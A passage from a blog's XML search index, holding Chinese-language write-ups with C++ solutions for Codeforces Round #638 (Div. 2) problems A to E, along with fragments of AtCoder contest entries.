punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">,</span> G<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round #638 (Div. 2)</title>
      <link href="/2020/05/02/Codeforces-Round-638-Div-2/"/>
      <url>/2020/05/02/Codeforces-Round-638-Div-2/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="Codeforces-Round-638-Div-2"><a href="#Codeforces-Round-638-Div-2" class="headerlink" title="Codeforces Round #638 (Div. 2)"></a>Codeforces Round #638 (Div. 2)</h1><h2 id="A-Phoenix-and-Balance"><a href="#A-Phoenix-and-Balance" class="headerlink" title="A. Phoenix and Balance"></a>A. Phoenix and Balance</h2><ul><li>题意:<br>给定一个数 $n$ ，让你将$2^1 + 2^2 + …+2^n$ 等分成两组数，使得这两组数的绝对值之差最小，输出最小值。</li><li>题解:<br>会发现可以用二进制表示这 $n$ 个数，那么对于给定$n=6$,则可以表示为 $100011$ 和$011100$，这两个数的绝对值之差最小。按这个思路模拟即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll  n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ll i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">;</span> i <span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cnt<span class="token operator">==</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cnt<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">abs</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="B-Phoenix-and-Beauty"><a href="#B-Phoenix-and-Beauty" class="headerlink" title="B.Phoenix and Beauty"></a>B.Phoenix and Beauty</h2><ul><li><p>题意:<br>给定两个数 $n,k$ ,和一个包含$n$个数的序列 , 通过向原串中插入数字构造一个串 , 使得任意长度为k的子串之和相等.</p></li><li><p>题解:</p></li></ul><ol><li>发现如果原序列的数字种类如果大于 $k$ 的话,无法构成序列.</li><li>如果小于 $k$ 的话,则可以填充任意数字到 $k$ ,然后每个序列重复$n$次即可.</li></ol><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> a<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> st<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin<span class="token operator">>></span>a<span class="token punctuation">;</span>        st<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">vec</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> st<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>m<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>vec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>m<span class="token punctuation">)</span>            vec<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> n <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>vec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> vec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                cout <span class="token operator">&lt;&lt;</span> vec<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="C-Phoenix-and-Distribution"><a href="#C-Phoenix-and-Distribution" class="headerlink" title="C. Phoenix and Distribution"></a>C. Phoenix and Distribution</h2><ul><li><p>题意:<br>给定两个数字 $n,k$ ,和包含n个字母的字符串,让你讲这个串以任意序列分割成 $k$ 份,定义一个 $max$ 表示分割完成后字典序最大的字符串,求出最小字符串 $max$.</p></li><li><p>题解:<br>先排序,然后将k个字符串多分配一个字母,以确保非空.之后看剩下的字母种类,如果只剩下一种字母,则循环分配 ; 如果剩下的字母大于一种,则将所有串都分配到字典序最小的那个串上.之后将分好的串排序,即可得到答案.</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string s<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">vec</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> fla <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> k <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span>fla<span class="token punctuation">)</span>            pos<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            fla <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    pos<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">//  cout &lt;&lt; pos &lt;&lt; "\n";</span>    set<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> st<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> k<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        st<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>st<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token operator">=</span>k<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            vec<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>            tmp<span class="token operator">++</span><span class="token punctuation">;</span>            tmp <span class="token operator">%=</span> pos<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> vec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> k<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            vec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> vec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="D-Phoenix-and-Science"><a href="#D-Phoenix-and-Science" class="headerlink" title="D. Phoenix and Science"></a>D. Phoenix and Science</h2><ul><li><p>题意:<br>给一个数 $n$ , 现存在一种细菌, 在白天可以分裂/不分裂,晚上所有细菌重量均+1,使用最小的天数,使得细菌总量恰好等于 $n$ .</p></li><li><p>题解:<br>贪心分裂,如果碰到了总数大于 $n$ 的情况,则回退,然后在将未超出部分添加到答案. 排序输出.这题调了好久QAQ.</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> ans<span class="token punctuation">;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ll n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">// ans.push_back(0);</span>    <span class="token comment">// while (sum&lt;n)</span>    <span class="token comment">// &#123;</span>    <span class="token comment">//     sum += (1 &lt;&lt; i);</span>    <span class="token comment">//     ans.push_back(i);</span>    <span class="token comment">//     i++;</span>    <span class="token comment">// &#125;</span>    <span class="token comment">// if(sum==n)</span>    <span class="token comment">// &#123;</span>    <span class="token comment">//     cout &lt;&lt; (int)ans.size()  &lt;&lt; "\n";</span>    <span class="token comment">//     for (int i = 1;i&lt;(int)ans.size();i++)</span>    <span class="token comment">//         cout &lt;&lt; ans[i] &lt;&lt; " ";</span>    <span class="token comment">//     cout &lt;&lt; "\n";</span>    <span class="token comment">// &#125;</span>    <span class="token comment">// else</span>    <span class="token comment">// &#123;</span>    <span class="token comment">//     i--;</span>    <span class="token comment">//     sum -= (1 &lt;&lt; i);</span>    <span class="token comment">//     int tmp = n - sum;</span>    <span class="token comment">//     ans.pop_back();</span>    <span class="token comment">//     //  cout &lt;&lt; ".....................   ";</span>    <span class="token comment">//     //cout &lt;&lt; n &lt;&lt; " " &lt;&lt; sum &lt;&lt; " " &lt;&lt; tmp &lt;&lt; "\n";</span>    <span class="token comment">//     ans.push_back(tmp);</span>    <span class="token comment">//     sort(ans.begin(), ans.end());</span>    <span class="token comment">//     cout &lt;&lt; (int)ans.size()  &lt;&lt; "\n";</span>    <span class="token comment">//     for (int i = 1;i&lt;(int)ans.size();i++)</span>    <span class="token comment">//     &#123;</span>    <span class="token comment">//         if(i+1!=ans.size()&amp;&amp; ans[i]==ans[i+1])</span>    <span class="token comment">//             cout &lt;&lt; 0 &lt;&lt; " ";</span>    <span class="token comment">//         else</span>    <span class="token comment">//             cout &lt;&lt; ans[i] &lt;&lt; " ";</span>    <span class="token comment">//     &#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">&lt;&lt;=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        n <span class="token operator">-=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> ans<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>ans<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ans<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> ans<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="E-Phoenix-and-Berries"><a href="#E-Phoenix-and-Berries" class="headerlink" title="E. Phoenix and Berries"></a>E. Phoenix and Berries</h2><ul><li><p>题意:<br>给 $n$ 个灌木丛和 容积为 $k$ 的袋子,n个灌木丛分别由 $a_i$ 个红浆果和 $b_i$ 个红浆果. 同种颜色或者同一个浆果丛的浆果可以放到同一个袋子里.求出能放满的袋子的最大数量.</p></li><li><p>题解:<br>发现对于所有浆果而言,能放满的袋子数量最大为 $max((suma+sumb)/k , suma+sumb)/k-1)$ .<br>我们可以使用dp求解. $dp[i][j]$ 表示到第 $i$ 个灌木丛,剩下 $j$ 个红浆果能否达到.</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll suma <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sumb <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        suma <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> sumb <span class="token operator">+=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">|=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>j <span class="token operator">-</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> k <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">%</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//当前红浆果的</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;=</span> <span class="token function">min</span><span class="token punctuation">(</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">)</span>                 <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>x<span class="token punctuation">)</span><span class="token operator">%</span>k<span class="token operator">+</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>=</span>k<span class="token punctuation">)</span>          <span class="token comment">//使用同一种灌木丛的蓝浆果是否能满足</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">|=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>j <span class="token operator">-</span> x <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">%</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    ll ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> <span class="token punctuation">(</span>suma <span class="token operator">+</span> sumb <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">/</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AtCoder ABC 164</title>
      <link href="/2020/04/27/AtCoder-ABC-164/"/>
      <url>/2020/04/27/AtCoder-ABC-164/</url>
      
